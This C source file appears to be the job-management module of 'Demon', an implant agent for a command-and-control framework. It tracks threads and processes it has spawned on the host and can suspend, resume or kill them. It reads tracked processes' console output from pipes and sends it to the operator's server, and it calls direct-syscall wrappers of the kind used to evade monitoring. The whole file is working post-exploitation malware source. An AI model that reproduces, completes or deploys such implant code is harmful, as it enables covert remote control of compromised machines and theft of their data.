#include <Demon.h>

#include <Core/Jobs.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

#include <Loader/ObjectApi.h>

/*!
 * JobAdd
 * Adds a job to the job linked list
 * @param JobID
 * @param Type type of job: thread or process
 * @param State current state of the job: suspended or running
 * @param Data Data pointer to extra data
 * @return
 */
VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
{
    PRINTF( "Add job => JobID:[%d] Type:[%d] State:[%d] Handle:[%d] Data:[%p]\n", JobID, Type, State, Handle, Data )

    PJOB_DATA JobList = NULL;
    PJOB_DATA Job     = NULL;

    Job = Instance.Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );

    // fill the Job info and insert it into our linked list
    Job->RequestID = RequestID;
    Job->JobID     = JobID;
    Job->Type      = Type;
    Job->State     = State;
    Job->Handle    = Handle;
    Job->Data      = Data;
    Job->Next      = NULL;

    if ( Instance.Jobs == NULL )
    {
        Instance.Jobs = Job;
        return;
    }

    JobList = Instance.Jobs;

    do {
        if ( JobList )
        {
            if ( JobList->Next != NULL )
                JobList = JobList->Next;
            else
            {
                JobList->Next = Job;
                break;
            }
        } else
            break;

    } while ( TRUE );
}

/*!
 * Check if all jobs are still running and exists
 * @return
 */
VOID JobCheckList()
{
    PJOB_DATA JobList = NULL;

    JobList = Instance.Jobs;

    do {
        if ( ! JobList )
            break;

        switch ( JobList->Type )
        {
            case JOB_TYPE_PROCESS:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    DWORD Return = 0;
                    Instance.Win32.GetExitCodeProcess( JobList->Handle, &Return );

                    if ( Return != STILL_ACTIVE )
                        JobList->State = JOB_STATE_DEAD;
                }
                break;
            }

            case JOB_TYPE_THREAD:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    DWORD Return = 0;
                    Instance.Win32.GetExitCodeThread( JobList->Handle, &Return );

                    if ( Return != STILL_ACTIVE )
                        JobList->State = JOB_STATE_DEAD;
                }

                break;
            }

            case JOB_TYPE_TRACK_PROCESS:
            {
                if ( JobList->State == JOB_STATE_RUNNING )
                {
                    DWORD Status = 0;

                    Instance.Win32.GetExitCodeProcess( JobList->Handle, &Status );

                    if ( Status != STILL_ACTIVE )
                    {
                        PUTS( "Tracking process is dead." )
                        JobList->State = JOB_STATE_DEAD;
                        AnonPipesRead( ( ( PANONPIPE ) JobList->Data ), JobList->RequestID );

                        // notify the TS that the process is dead, so that the RequestID can be closed
                        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_JOB, JobList->RequestID );
                        PackageAddInt32( Package, DEMON_COMMAND_JOB_DIED );
                        PackageTransmit( Package );

                        // free resources
                        SysNtClose( JobList->Handle );
                        JobList->Handle = NULL;
                        if ( ( ( PANONPIPE ) JobList->Data )->StdOutWrite )
                        {
                            SysNtClose( ( ( PANONPIPE ) JobList->Data )->StdOutWrite );
                            (( PANONPIPE ) JobList->Data )->StdOutWrite = NULL;
                        }

                        if ( ( ( PANONPIPE ) JobList->Data )->StdOutRead )
                        {
                            SysNtClose( ( ( PANONPIPE ) JobList->Data )->StdOutRead );
                            ( ( PANONPIPE ) JobList->Data )->StdOutRead = NULL;
                        }
                        DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
                        JobList->Data = NULL;

                        // remove the job entry
                        JobRemove( JobList->JobID );
                    }
                    else
                    {
                        // just read what there is available.
                        DWORD Available = 0;
                        PVOID Buffer    = NULL;
                        DWORD Size      = 0;

                        if ( Instance.Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                        {
                            PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );

                            if ( Available > 0 )
                            {
                                Size   = Available;
                                Buffer = Instance.Win32.LocalAlloc( LPTR, Size );

                                if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                {
                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                    PackageAddBytes( Package, Buffer, Available );
                                    PackageTransmit( Package );
                                }

                                DATA_FREE( Buffer, Size )
                            }
                        }
                    }
                }

                break;
            }
        }

        JobList = JobList->Next;
    } while ( TRUE );
}

/*!
 * JobSuspend
 * Suspends the specified job
 * @param JobID
 * @return
 */
BOOL JobSuspend( DWORD JobID )
{
    PJOB_DATA JobList = Instance.Jobs;

    while ( JobList )
    {
        if ( JobList->JobID == JobID )
        {
            PRINTF( "Found Job ID: %d", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )
            {
                PUTS( "Suspending Thread" )
                HANDLE   Handle   = JobList->Handle;
                NTSTATUS NtStatus = STATUS_SUCCESS;

                if ( Handle )
                {
                    NtStatus = SysNtSuspendThread( JobList->Handle, NULL );
                    if ( NT_SUCCESS( NtStatus ) ) {
                        JobList->State = JOB_STATE_SUSPENDED;
                        return TRUE;
                    } else {
                        return FALSE;
                    }
                }
                else
                {
                    PUTS( "Handle is empty" )
                    return FALSE;
                }
            }
        }

        JobList = JobList->Next;
    }

    return FALSE;
}

/*!
 * JobSuspend
 * Suspends the specified job
 * @param JobID
 * @return
 */
BOOL JobResume( DWORD JobID )
{
    PJOB_DATA JobList = Instance.Jobs;

    while ( JobList )
    {
        if ( JobList->JobID == JobID )
        {
            PRINTF( "Found Job ID: %d", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )
            {
                PUTS( "Resume Thread" )
                HANDLE   Handle   = JobList->Handle;
                NTSTATUS NtStatus = STATUS_SUCCESS;

                if ( Handle )
                {
                    NtStatus = SysNtResumeThread( JobList->Handle, NULL );
                    if ( NT_SUCCESS( NtStatus ) )
                    {
                        JobList->State = JOB_STATE_RUNNING;
                        return TRUE;
                    }
                    else
                        return FALSE;
                }
                else
                {
                    PUTS( "Handle is empty" )
                    return FALSE;
                }
            }
        }

        JobList = JobList->Next;
    }

    return FALSE;
}

/*!
 * JobKill
 * Kills and remove the specified job
 * @param JobID
 * @return
 */
BOOL JobKill( DWORD JobID )
{
    BOOL      Success = FALSE;
    PJOB_DATA JobList = Instance.Jobs;

    while ( JobList )
    {
        if ( JobList->JobID == JobID )
        {
            Success = TRUE;
            PRINTF( "Found Job ID: %d\n", JobID )

            switch ( JobList->Type )
            {
                case JOB_TYPE_THREAD:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        PUTS( "Kill Thread" )
                        NTSTATUS NtStatus = STATUS_SUCCESS;

                        if ( JobList->Handle )
                        {
                            PUTS( "Kill using handle" )

                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                            {
                                PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
                                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                                PACKAGE_ERROR_WIN32;
                                Success = FALSE;
                            }
                            else
                            {
                                // remove one thread from counter
                                Instance.Threads--;
                            }
                        }
                        else
                        {
                            PUTS( "Handle is empty" )
                            Success = FALSE;
                        }
                    }
                    break;
                }

                case JOB_TYPE_PROCESS:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        Instance.Win32.TerminateProcess( JobList->Handle, 0 );
                    }
                    break;
                }

                case JOB_TYPE_TRACK_PROCESS:
                {
                    if ( JobList->State != JOB_STATE_DEAD )
                    {
                        Instance.Win32.TerminateProcess( JobList->Handle, 0 );

                        // just read what there is available.
                        DWORD Available = 0;
                        PVOID Buffer    = NULL;

                        if ( Instance.Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
                        {
                            PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );

                            if ( Available > 0 )
                            {
                                DWORD Size = Available;
                                Buffer = Instance.Win32.LocalAlloc( LPTR, Size );

                                if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                {
                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                    PackageAddBytes( Package, Buffer, Available );
                                    PackageTransmit( Package );
                                }

                                DATA_FREE( Buffer, Size )
                            }
                        }
                    }

                    break;
                }
            }

            JobRemove( JobID );
        }

        JobList = JobList->Next;
    }

    return Success;
}

/*!
 * JobRemove
 * Remove the specified job
 * @param ThreadID
 * @return
 */
VOID JobRemove( DWORD JobID )
{
    // Iterate over Job list and replace/remove job
    PRINTF( "Remove JobID: %d\n", JobID );
    PUTS( "Iterate over Job list and replace/remove job" )
    PJOB_DATA JobList     = NULL;
    PJOB_DATA JobToRemove = NULL;

    if ( Instance.Jobs && Instance.Jobs->JobID == JobID )
    {
        JobToRemove = Instance.Jobs;
        Instance.Jobs = JobToRemove->Next;
    }
    else
    {
        JobList = Instance.Jobs;

        while ( JobList )
        {
            if ( JobList->Next && JobList->Next->JobID == JobID )
            {
                JobToRemove = JobList->Next;
                JobList->Next = JobToRemove->Next;
            }
            else
            {
                JobList = JobList->Next;
            }
        }
    }

    if ( ! JobToRemove )
    {
        PRINTF( "JobID %d not found\n", JobID );
        return;
    }

    if ( JobToRemove->Handle )
        SysNtClose( JobToRemove->Handle );

    if ( ( JobToRemove->Type == JOB_TYPE_TRACK_PROCESS ) && JobToRemove->Data )
    {
        DATA_FREE( JobToRemove->Data, sizeof( ANONPIPE ) )
    }

    MemSet( JobToRemove, 0, sizeof( JOB_DATA ) );
    Instance.Win32.LocalFree( JobToRemove );
    JobToRemove = NULL;
}
